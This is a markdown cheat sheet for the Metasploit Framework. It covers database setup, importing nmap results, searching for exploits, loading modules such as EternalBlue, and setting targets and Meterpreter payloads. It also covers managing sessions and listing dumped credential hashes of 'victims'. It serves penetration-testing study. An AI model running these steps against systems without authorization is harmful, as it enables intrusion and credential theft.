# MetaSploit

###### Metasploit framework is an open source project for computer security that find security issues, verify vulnerability mitigations & manage security assessments

- Check MetaSploit [MetaSploit site](https://www.metasploit.com/)

## First Start

First start PostgreSQL database

```
	• service postgresql start
```

We start the service and see that it is started

```
	• service postgresql status
```

We see that there is also the open port

```
	• netstat -antp
```

We will then create the Metasploit Framework database in PostGreSQL. This will only need to be done the first time we use it

```
	• msfdb init
```

And we started Metasploit Framework

```
	• msfconsole
```

External databases of exploits

```
	• https://www.rapid7.com/db/
	• https://www.exploit-db.com/
	• https://0day.today/webapps
	• https://github.com/BuffaloWill/oxml_xxe
	• https://www.securityfocus.com/vulnerabilities
	• https://vuldb.com/es/
```

## Basic Commands

With the help command we can see which commands we can perform in the framework

```
	• help
```

Check the status of the database

```
	• db_status
```

We used the import command and like the xml file, we may have taken it from a previous NMAP scan


```
	• db_import nmap_output.xml
```


With the host command we can see the hosts we have imported into the Metasploit database

```
	• host
```

We can see which services are available for the victim machines we have loaded before with db_import

```
	• services
```

To see if you have any imported machines the port 21 is open

```
	• services -p 21
```

To see services associated with your name

```
	• services -S ms-sql
```


## AUXILIARYs & EXPLOITs & Payloads


We can look for exploits/auxiliarys to be able to run against the target machine related to a service or protocol. With "search" we will look only for the sploits that are part of Metasploit

```
	• search ftp
```

You can also search by the vulnerability code, in this case MS17-010

```
	• search MS17-010
```

With "searchsploit" we will look for any exploit, whether it is part of Metasploit database

```
	• searchsploit vsftpd
```

To set a exploits/auxiliarys module:

```
	• use auxiliary/scanner/ftp/anonymous
	• use exploit/windows/smb/ms17_010_eternalblue	
```

To execute a auxiliary module:

```
	• run
```

To execute a exploit module:

```
	• exploit
```

To have more information about a exploits/auxiliarys

```
	• info
```

In order to see the options of the exploits/auxiliarys set, information such as the victim/attacker IP, victim/attacker port, user/passwords to be used on the victim..

```
	• show options
```

We can see the type of target this exploit is for


```
	• show targets
```


In order to see the payloads that we can use using this exploit towards the victim 

```
	• show payloads
```

To set one of these options with the value we want

```
	• set rhost 192.168.152.130
```

To set one of these options with a permanent value

```
	• setg rhost 192.168.152.130
```

To set one of the payloads allowed for that exploit

```
	• set payload 1
	• set payload windows/meterpreter/bind_tcp	
```


To remove the value we have set with the set, we make the following command

```
	• unset rhost 192.168.152.130
```



## Special Commands

To see all the sessions that are active in the background

```
	• sessions
```

To connect to one of these sessions

```
	• sessions 2
```

You can use creds that save all hashdumped hashes of your victims

```
	• creds
```

